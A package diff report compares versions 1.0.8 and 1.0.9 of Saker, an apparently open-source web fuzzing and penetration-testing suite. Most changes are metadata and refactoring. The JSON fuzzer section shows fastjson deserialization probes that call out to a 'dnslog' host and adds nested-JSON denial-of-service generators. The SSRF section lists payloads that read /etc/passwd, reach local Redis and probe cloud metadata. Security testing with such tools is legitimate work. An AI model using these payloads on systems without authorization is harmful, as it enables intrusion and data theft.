+-rw-rw-rw-   0        0        0    12952 2021-10-19 00:56:15.000000 Saker-1.0.9/saker/fuzzers/xss.py
+-rw-rw-rw-   0        0        0     1147 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/fuzzers/xxe.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.087760 Saker-1.0.9/saker/handler/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/handler/__init__.py
+-rw-rw-rw-   0        0        0     1108 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/handler/headerHandler.py
+-rw-rw-rw-   0        0        0     2311 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/handler/htmlHandler.py
+-rw-rw-rw-   0        0        0     5889 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/handler/wappalyzer.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.097420 Saker-1.0.9/saker/payloads/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/__init__.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.100015 Saker-1.0.9/saker/payloads/misc/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/misc/__init__.py
+-rw-rw-rw-   0        0        0      587 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/misc/thinkphp5_rce.py
+-rw-rw-rw-   0        0        0      718 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/misc.py
+-rw-rw-rw-   0        0        0     4076 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/phpShell.py
+-rw-rw-rw-   0        0        0     1099 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/payloads/xdebug.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.123952 Saker-1.0.9/saker/port/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/__init__.py
+-rw-rw-rw-   0        0        0      482 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/elasticsearch.py
+-rw-rw-rw-   0        0        0      721 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/ftp.py
+-rw-rw-rw-   0        0        0     1024 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/jdwp.py
+-rw-rw-rw-   0        0        0      579 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/memcached.py
+-rw-rw-rw-   0        0        0      485 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/mongo.py
+-rw-rw-rw-   0        0        0     2798 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/nmap.py
+-rw-rw-rw-   0        0        0       99 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/portBase.py
+-rw-rw-rw-   0        0        0     2859 2022-06-14 07:56:26.000000 Saker-1.0.9/saker/port/probe.py
+-rw-rw-rw-   0        0        0      872 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/redis.py
+-rw-rw-rw-   0        0        0     2285 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/ssh.py
+-rw-rw-rw-   0        0        0      671 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/port/telnet.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.126951 Saker-1.0.9/saker/servers/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/__init__.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.134921 Saker-1.0.9/saker/servers/http/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/http/__init__.py
+-rw-rw-rw-   0        0        0      996 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/http/base.py
+-rw-rw-rw-   0        0        0      391 2022-04-01 00:54:06.000000 Saker-1.0.9/saker/servers/http/dos.py
+-rw-rw-rw-   0        0        0      830 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/http/ssrf.py
+-rw-rw-rw-   0        0        0      532 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/http/xss.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.144547 Saker-1.0.9/saker/servers/socket/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/socket/__init__.py
+-rw-rw-rw-   0        0        0     1863 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/socket/dnsproxy.py
+-rw-rw-rw-   0        0        0     1803 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/servers/socket/dnsrebinding.py
+-rw-rw-rw-   0        0        0      458 2022-11-07 02:56:06.000000 Saker-1.0.9/saker/servers/socket/tcp.py
+drwxrwxrwx   0        0        0        0 2022-12-26 06:24:34.183687 Saker-1.0.9/saker/utils/
+-rw-rw-rw-   0        0        0        0 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/__init__.py
+-rw-rw-rw-   0        0        0      158 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/binutils.py
+-rw-rw-rw-   0        0        0      411 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/color.py
+-rw-rw-rw-   0        0        0     1956 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/configcheck.py
+-rw-rw-rw-   0        0        0     5918 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/daemon.py
+-rw-rw-rw-   0        0        0     2205 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/datatype.py
+-rw-rw-rw-   0        0        0     4423 2022-07-27 01:19:31.000000 Saker-1.0.9/saker/utils/domain.py
+-rw-rw-rw-   0        0        0      834 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/encode.py
+-rw-rw-rw-   0        0        0     1672 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/fakeid.py
+-rw-rw-rw-   0        0        0     1407 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/flaskencoder.py
+-rw-rw-rw-   0        0        0     1580 2022-07-11 06:48:27.000000 Saker-1.0.9/saker/utils/geoip.py
+-rw-rw-rw-   0        0        0      814 2022-07-18 01:31:17.000000 Saker-1.0.9/saker/utils/hash.py
+-rw-rw-rw-   0        0        0     7953 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/httpparser.py
+-rw-rw-rw-   0        0        0      498 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/info.py
+-rw-rw-rw-   0        0        0      766 2022-07-25 06:23:26.000000 Saker-1.0.9/saker/utils/ip.py
+-rw-rw-rw-   0        0        0     2012 2022-07-28 09:01:29.000000 Saker-1.0.9/saker/utils/logger.py
+-rw-rw-rw-   0        0        0     1327 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/mtime.py
+-rw-rw-rw-   0        0        0     1495 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/paths.py
+-rw-rw-rw-   0        0        0     1762 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/serializer.py
+-rw-rw-rw-   0        0        0      626 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/show.py
+-rw-rw-rw-   0        0        0     2221 2021-10-19 00:56:16.000000 Saker-1.0.9/saker/utils/url.py
+-rw-rw-rw-   0        0        0       42 2022-12-26 06:24:34.187677 Saker-1.0.9/setup.cfg
+-rw-rw-rw-   0        0        0     1070 2022-12-26 06:24:02.000000 Saker-1.0.9/setup.py
```

### filetype from file(1)

```diff
@@ -1 +1 @@
-POSIX tar archive (GNU)
+POSIX tar archive
```

### Comparing `Saker-1.0.8/PKG-INFO` & `Saker-1.0.9/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: Saker
-Version: 1.0.8
+Version: 1.0.9
 Summary: Tool For Fuzz Web Applications
 Home-page: https://github.com/LyleMi/Saker
 Author: Lyle
 Author-email: lylemi@126.com
 License: GPLv3 Licence
 Description: <p align="center">
           <a href="" target="_blank" rel="noopener noreferrer">
@@ -293,14 +293,14 @@
         
         ## Issues
         
         If you face any issue, you can create a new issue in the [Issues Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you out.
         
         ## License
         
-        Copyright © 2019-2020 [Lyle](https://github.com/lylemi).
+        Copyright © 2019-2021 [Lyle](https://github.com/lylemi).
         
         This project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE) licensed.
         
 Keywords: Web Security,Fuzz
 Platform: any
 Description-Content-Type: text/markdown
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: Saker Version: 1.0.8 Summary: Tool For Fuzz Web
+Metadata-Version: 2.1 Name: Saker Version: 1.0.9 Summary: Tool For Fuzz Web
 Applications Home-page: https://github.com/LyleMi/Saker Author: Lyle Author-
 email: lylemi@126.com License: GPLv3 Licence Description:
                                  [Saker logo]
                    *** Penetrate Testing Auxiliary Suite ***
   [https://img.shields.io/badge/Python-3.6-blue.svg] [https://img.shields.io/
  github/issues/lylemi/saker.svg] [https://img.shields.io/github/stars/lylemi/
   saker.svg] [https://img.shields.io/github/forks/lylemi/saker.svg] [https://
@@ -74,11 +74,11 @@
 Contributions, issues and feature requests are welcome. Feel free to check
 [issues page](https://github.com/lylemi/saker/issues) if you want to
 contribute. ## Disclaimer This project is for educational purposes only. Do not
 test or attack any system with this tool unless you have explicit permission to
 do so. ## Show your support Please star this repository if this project helped
 you. ## Issues If you face any issue, you can create a new issue in the [Issues
 Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you
-out. ## License Copyright Â© 2019-2020 [Lyle](https://github.com/lylemi). This
+out. ## License Copyright Â© 2019-2021 [Lyle](https://github.com/lylemi). This
 project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE)
 licensed. Keywords: Web Security,Fuzz Platform: any Description-Content-Type:
 text/markdown
```

### Comparing `Saker-1.0.8/README.md` & `Saker-1.0.9/README.md`

 * *Files 0% similar despite different names*

```diff
@@ -285,10 +285,10 @@
 
 ## Issues
 
 If you face any issue, you can create a new issue in the [Issues Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you out.
 
 ## License
 
-Copyright © 2019-2020 [Lyle](https://github.com/lylemi).
+Copyright © 2019-2021 [Lyle](https://github.com/lylemi).
 
 This project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE) licensed.
```

#### html2text {}

```diff
@@ -71,10 +71,10 @@
 Contributions, issues and feature requests are welcome. Feel free to check
 [issues page](https://github.com/lylemi/saker/issues) if you want to
 contribute. ## Disclaimer This project is for educational purposes only. Do not
 test or attack any system with this tool unless you have explicit permission to
 do so. ## Show your support Please star this repository if this project helped
 you. ## Issues If you face any issue, you can create a new issue in the [Issues
 Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you
-out. ## License Copyright Â© 2019-2020 [Lyle](https://github.com/lylemi). This
+out. ## License Copyright Â© 2019-2021 [Lyle](https://github.com/lylemi). This
 project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE)
 licensed.
```

### Comparing `Saker-1.0.8/Saker.egg-info/PKG-INFO` & `Saker-1.0.9/Saker.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: Saker
-Version: 1.0.8
+Version: 1.0.9
 Summary: Tool For Fuzz Web Applications
 Home-page: https://github.com/LyleMi/Saker
 Author: Lyle
 Author-email: lylemi@126.com
 License: GPLv3 Licence
 Description: <p align="center">
           <a href="" target="_blank" rel="noopener noreferrer">
@@ -293,14 +293,14 @@
         
         ## Issues
         
         If you face any issue, you can create a new issue in the [Issues Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you out.
         
         ## License
         
-        Copyright © 2019-2020 [Lyle](https://github.com/lylemi).
+        Copyright © 2019-2021 [Lyle](https://github.com/lylemi).
         
         This project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE) licensed.
         
 Keywords: Web Security,Fuzz
 Platform: any
 Description-Content-Type: text/markdown
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: Saker Version: 1.0.8 Summary: Tool For Fuzz Web
+Metadata-Version: 2.1 Name: Saker Version: 1.0.9 Summary: Tool For Fuzz Web
 Applications Home-page: https://github.com/LyleMi/Saker Author: Lyle Author-
 email: lylemi@126.com License: GPLv3 Licence Description:
                                  [Saker logo]
                    *** Penetrate Testing Auxiliary Suite ***
   [https://img.shields.io/badge/Python-3.6-blue.svg] [https://img.shields.io/
  github/issues/lylemi/saker.svg] [https://img.shields.io/github/stars/lylemi/
   saker.svg] [https://img.shields.io/github/forks/lylemi/saker.svg] [https://
@@ -74,11 +74,11 @@
 Contributions, issues and feature requests are welcome. Feel free to check
 [issues page](https://github.com/lylemi/saker/issues) if you want to
 contribute. ## Disclaimer This project is for educational purposes only. Do not
 test or attack any system with this tool unless you have explicit permission to
 do so. ## Show your support Please star this repository if this project helped
 you. ## Issues If you face any issue, you can create a new issue in the [Issues
 Tab](https://github.com/lylemi/saker/issues) and I will be glad to help you
-out. ## License Copyright Â© 2019-2020 [Lyle](https://github.com/lylemi). This
+out. ## License Copyright Â© 2019-2021 [Lyle](https://github.com/lylemi). This
 project is [GPLv3](https://github.com/lylemi/saker/blob/master/LICENSE)
 licensed. Keywords: Web Security,Fuzz Platform: any Description-Content-Type:
 text/markdown
```

### Comparing `Saker-1.0.8/Saker.egg-info/SOURCES.txt` & `Saker-1.0.9/Saker.egg-info/SOURCES.txt`

 * *Files 2% similar despite different names*

```diff
@@ -1,7 +1,8 @@
+LICENSE
 README.md
 setup.py
 Saker.egg-info/PKG-INFO
 Saker.egg-info/SOURCES.txt
 Saker.egg-info/dependency_links.txt
 Saker.egg-info/requires.txt
 Saker.egg-info/top_level.txt
@@ -11,18 +12,21 @@
 saker/api/censys.py
 saker/api/crtsh.py
 saker/api/dingtalk.py
 saker/api/dnsdumpster.py
 saker/api/fofa.py
 saker/api/gaode.py
 saker/api/githubapi.py
+saker/api/icp.py
 saker/api/proxypool.py
+saker/api/rwhois.py
 saker/api/shodanapi.py
 saker/api/sqlmap.py
 saker/api/threatcrowd.py
+saker/api/whois.py
 saker/brute/__init__.py
 saker/brute/basicAuth.py
 saker/brute/brute.py
 saker/brute/brute_win.py
 saker/brute/cs.py
 saker/brute/dir.py
 saker/brute/domain.py
@@ -30,22 +34,25 @@
 saker/brute/ftp.py
 saker/brute/mysql.py
 saker/brute/smtp.py
 saker/brute/ssh.py
 saker/brute/telnet.py
 saker/brute/zip.py
 saker/cmdline/__init__.py
+saker/cmdline/file.py
 saker/cmdline/fuzz.py
 saker/cmdline/fuzzsock.py
+saker/cmdline/poc.py
 saker/cmdline/port.py
 saker/cmdline/scan.py
 saker/cmdline/server.py
 saker/cmdline/util.py
 saker/core/__init__.py
 saker/core/mutator.py
+saker/core/poc.py
 saker/core/rawhttp.py
 saker/core/request.py
 saker/core/scaner.py
 saker/core/sess.py
 saker/core/sock.py
 saker/data/__init__.py
 saker/data/banner.py
@@ -104,14 +111,15 @@
 saker/port/probe.py
 saker/port/redis.py
 saker/port/ssh.py
 saker/port/telnet.py
 saker/servers/__init__.py
 saker/servers/http/__init__.py
 saker/servers/http/base.py
+saker/servers/http/dos.py
 saker/servers/http/ssrf.py
 saker/servers/http/xss.py
 saker/servers/socket/__init__.py
 saker/servers/socket/dnsproxy.py
 saker/servers/socket/dnsrebinding.py
 saker/servers/socket/tcp.py
 saker/utils/__init__.py
@@ -124,13 +132,14 @@
 saker/utils/encode.py
 saker/utils/fakeid.py
 saker/utils/flaskencoder.py
 saker/utils/geoip.py
 saker/utils/hash.py
 saker/utils/httpparser.py
 saker/utils/info.py
+saker/utils/ip.py
 saker/utils/logger.py
 saker/utils/mtime.py
 saker/utils/paths.py
 saker/utils/serializer.py
 saker/utils/show.py
 saker/utils/url.py
```

### Comparing `Saker-1.0.8/saker/api/censys.py` & `Saker-1.0.9/saker/api/censys.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/crtsh.py` & `Saker-1.0.9/saker/api/crtsh.py`

 * *Files 10% similar despite different names*

```diff
@@ -3,14 +3,15 @@
 
 import psycopg2
 
 
 def crtsh(domain):
     '''
     get subdomain info via certificate identity by crt.sh's database
+    psql -hcrt.sh -Uguest certwatch
     '''
     HOST = 'crt.sh'
     NAME = 'certwatch'
     USER = 'guest'
     try:
         conn = psycopg2.connect("dbname=%s user=%s host=%s" % (NAME, USER, HOST))
         conn.autocommit = True
```

### Comparing `Saker-1.0.8/saker/api/dingtalk.py` & `Saker-1.0.9/saker/api/dingtalk.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/dnsdumpster.py` & `Saker-1.0.9/saker/api/dnsdumpster.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/fofa.py` & `Saker-1.0.9/saker/api/fofa.py`

 * *Files 10% similar despite different names*

```diff
@@ -5,29 +5,34 @@
 import requests
 
 from saker.utils.encode import b64e
 
 
 class Fofa(object):
 
-    url = "https://fofa.so/api/"
+    url = "https://fofa.info/api/"
 
     def __init__(self, email, key):
         super(Fofa, self).__init__()
         self.s = requests.Session()
         self.email = email
         self.key = key
 
-    def search(self, query, page=1, size=100, full="false"):
+    def search(self, query, page=1, size=100, full="false", fields=""):
+        """
+        fields 默认host,ip,port
+        """
         qbase64 = b64e(query)
         api = "v1/search/all"
         params = {
             "qbase64": qbase64,
             "page": page,
             "size": size,
             "full": full,
             "email": self.email,
             "key": self.key,
         }
+        if fields:
+            params["fields"] = fields
         r = self.s.get(self.url + api, params=params)
         data = json.loads(r.text)
         return data
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `Saker-1.0.8/saker/api/gaode.py` & `Saker-1.0.9/saker/api/gaode.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/githubapi.py` & `Saker-1.0.9/saker/api/githubapi.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/proxypool.py` & `Saker-1.0.9/saker/api/proxypool.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/shodanapi.py` & `Saker-1.0.9/saker/api/shodanapi.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/sqlmap.py` & `Saker-1.0.9/saker/api/sqlmap.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/api/threatcrowd.py` & `Saker-1.0.9/saker/api/threatcrowd.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/basicAuth.py` & `Saker-1.0.9/saker/brute/basicAuth.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/brute.py` & `Saker-1.0.9/saker/brute/brute.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/brute_win.py` & `Saker-1.0.9/saker/brute/brute_win.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/cs.py` & `Saker-1.0.9/saker/brute/cs.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/dir.py` & `Saker-1.0.9/saker/brute/dir.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/domain.py` & `Saker-1.0.9/saker/brute/domain.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/email.py` & `Saker-1.0.9/saker/brute/email.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/ftp.py` & `Saker-1.0.9/saker/brute/ftp.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/mysql.py` & `Saker-1.0.9/saker/brute/mysql.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/smtp.py` & `Saker-1.0.9/saker/brute/smtp.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/ssh.py` & `Saker-1.0.9/saker/brute/ssh.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/telnet.py` & `Saker-1.0.9/saker/brute/telnet.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/brute/zip.py` & `Saker-1.0.9/saker/brute/zip.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/cmdline/fuzz.py` & `Saker-1.0.9/saker/cmdline/fuzz.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/cmdline/fuzzsock.py` & `Saker-1.0.9/saker/cmdline/fuzzsock.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/cmdline/port.py` & `Saker-1.0.9/saker/cmdline/port.py`

 * *Files 8% similar despite different names*

```diff
@@ -21,14 +21,18 @@
         dest="file", help="use file as scan target"
     )
     parser.add_argument(
         "-b", "--background", action="store_true",
         help="run port scanner in background with unix daemon, only support unix platform"
     )
     parser.add_argument(
+        "-n", "--nmap", action="store_true",
+        help="use nmap"
+    )
+    parser.add_argument(
         "-p", "--port",
         dest="port", help="scan port scope"
     )
     opts = parser.parse_args(args)
 
     targets = []
     task = ""
```

### Comparing `Saker-1.0.8/saker/cmdline/scan.py` & `Saker-1.0.9/saker/cmdline/scan.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/cmdline/server.py` & `Saker-1.0.9/saker/cmdline/server.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/core/mutator.py` & `Saker-1.0.9/saker/core/mutator.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,7 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 import time
 from saker.fuzzers.url import URL
 from saker.fuzzers.bof import BOF
 from saker.fuzzers.cmdi import CmdInjection
 from saker.fuzzers.code import Code
 from saker.fuzzers.fileinclude import FileInclude
 from saker.fuzzers.ldap import LdapInjection
```

### Comparing `Saker-1.0.8/saker/core/rawhttp.py` & `Saker-1.0.9/saker/core/rawhttp.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/core/request.py` & `Saker-1.0.9/saker/core/request.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,7 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 import time
 import requests
 from saker.utils.color import red, cyan, green
 from saker.utils.hash import md5
 
 
 class Request(object):
```

### Comparing `Saker-1.0.8/saker/core/scaner.py` & `Saker-1.0.9/saker/core/scaner.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,7 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 import time
 import random
 
 from saker.brute.dir import DirBrute
 from saker.core.sess import Sess
 from saker.handler.headerHandler import HeaderHandler
 from saker.handler.htmlHandler import HTMLHandler
```

### Comparing `Saker-1.0.8/saker/core/sess.py` & `Saker-1.0.9/saker/core/sess.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,7 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 import os
 import json
 import pickle
 import random
 import requests
 
 from saker.handler.headerHandler import HeaderHandler
@@ -25,15 +22,15 @@
         lastr (TYPE): last response
         s (TYPE): Session
         timeout (int): Default requests timeout
         url (TYPE): Main url
     """
 
     # 'Mozilla/<version> (<system-information>) <platform> (<platform-details>) <extensions>'
-    ffua = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0'
+    ffua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0'
 
     def __init__(
             self, url="", verify=False,
             timeout=0, loglevel="debug"
     ):
         """
         Args:
@@ -48,14 +45,33 @@
         self.url = normalizeUrl(url)
         self.loglevel = loglevel
         self.logger = getLogger()
         self.lastr = None
         self.s.verify = verify
         self.setUA(self.ffua)
 
+    @property
+    def jsonr(self):
+        """
+        json format response
+        """
+        if self.lastr is None:
+            return {}
+        try:
+            if self.lastr.text.startswith("{"):
+                return AttribDict(json.loads(self.lastr.text))
+            else:
+                # 处理数组类型的返回
+                return json.loads(self.lastr.text)
+        except json.decoder.JSONDecodeError as e:
+            pass
+        except Exception as e:
+            print(repr(e))
+        return {}
+
     def get(self, path="", *args, **kwargs):
         self.lastr = self.s.get(self.url + path, *args, **kwargs)
         self._callback()
         return self.lastr
 
     def post(self, path="", *args, **kwargs):
         self.lastr = self.s.post(self.url + path, *args, **kwargs)
@@ -92,41 +108,29 @@
                 return self.lastr.content
 
     def trace(self):
         """Trace requests
         """
         if self.lastr is None:
             return
+        print(self.lastr.request.url)
+        print(self.lastr.request.body)
         HeaderHandler(self.lastr.request.headers).show()
         HeaderHandler(self.lastr.headers).show()
         print(self.lastr.text)
         if not self.lastr.history:
             return
         for r in self.lastr.history:
             print(r.url)
         print(self.lastr.url)
 
     def _callback(self):
         """Request Callback
         """
-        if 'Content-Type' in self.lastr.headers and self.lastr.headers['Content-Type'].startswith('application/json;'):
-            self.jsonLoadr()
-
-    def jsonLoadr(self):
-        """load json response
-        """
-        if self.lastr is None:
-            return
-        try:
-            self.jsonr = AttribDict(json.loads(self.lastr.text))
-            return self.jsonr
-        except json.decoder.JSONDecodeError as e:
-            pass
-        except Exception as e:
-            print(repr(e))
+        pass
 
     def loadCookie(self, pkl='.cookie.pkl'):
         """load saved cookie
 
         Args:
             pkl (str, optional): cookie file name
         """
@@ -154,14 +158,17 @@
             self.s.proxies = proxies
         elif isinstance(proxies, str):
             self.s.proxies = {
                 "http": proxies,
                 "https": proxies,
             }
 
+    def setAuth(self, username, password):
+        self.s.auth = (username, password)
+
     def setHeader(self, key, value):
         self.s.headers[key] = value
 
     def setUA(self, UA=""):
         """set default User Agent
         """
         ua = UA if UA else self.randua()
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `Saker-1.0.8/saker/core/sock.py` & `Saker-1.0.9/saker/core/sock.py`

 * *Files 4% similar despite different names*

```diff
@@ -24,22 +24,26 @@
 
     def close(self):
         self.sock.close()
 
 
 class tcpSock(Sock):
 
-    def __init__(self, addr, port, ssl=False):
+    def __init__(self, addr, port, ssl=False, init=True):
         super(tcpSock, self).__init__(addr, port)
         self.sock = socket.socket(
             socket.AF_INET, socket.SOCK_STREAM
         )
         if ssl:
             self.sock = wrapSSL(self.sock)
-        self.sock.connect((addr, port))
+        if init:
+            self.conn()
+
+    def conn(self):
+        self.sock.connect((self.addr, self.port))
 
     def send(self, data):
         return self.sock.send(data)
 
     def recv(self, len=None):
         return self.sock.recv(len)
```

### Comparing `Saker-1.0.8/saker/data/sort.py` & `Saker-1.0.9/saker/data/sort.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/cmdi.py` & `Saker-1.0.9/saker/fuzzers/cmdi.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/code.py` & `Saker-1.0.9/saker/fuzzers/code.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/cors.py` & `Saker-1.0.9/saker/fuzzers/cors.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/crlf.py` & `Saker-1.0.9/saker/fuzzers/crlf.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/dos.py` & `Saker-1.0.9/saker/fuzzers/dos.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/fileinclude.py` & `Saker-1.0.9/saker/fuzzers/fileinclude.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/fuzzer.py` & `Saker-1.0.9/saker/fuzzers/fuzzer.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/http.py` & `Saker-1.0.9/saker/fuzzers/http.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/httpSmuggle.py` & `Saker-1.0.9/saker/fuzzers/httpSmuggle.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/json.py` & `Saker-1.0.9/saker/fuzzers/json.py`

 * *Files 3% similar despite different names*

```diff
@@ -40,7 +40,19 @@
         """{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}""",
         """{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}""",
         """{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0""",
     ]
 
     def __init__(self):
         super(JSON, self).__init__()
+
+    def max_depth(self, depth):
+        return  '{"0":' * depth + "{}" + "}" * depth
+
+    def max_array_length(self, length):
+        return [0] * length
+
+    def max_object_count(self, length):
+        obj = {}
+        for i in range(length):
+            obj[i] = i
+        return obj
```

### Comparing `Saker-1.0.8/saker/fuzzers/ldap.py` & `Saker-1.0.9/saker/fuzzers/ldap.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/mysqli.py` & `Saker-1.0.9/saker/fuzzers/mysqli.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/password.py` & `Saker-1.0.9/saker/fuzzers/password.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/sqli.py` & `Saker-1.0.9/saker/fuzzers/sqli.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/ssrf.py` & `Saker-1.0.9/saker/fuzzers/ssrf.py`

 * *Files 1% similar despite different names*

```diff
@@ -73,14 +73,19 @@
     protopayloads = [
         "file:///etc/passwd",
         "dict://127.0.0.1:6379/info",
         "gopher://127.0.0.1",
         "ftp://user:pwd@127.0.0.1",
     ]
 
+    cloud_payloads = [
+        # k8s
+        "http://metadata-db",
+    ]
+
     def __init__(self):
         super(SSRF, self).__init__()
 
     @classmethod
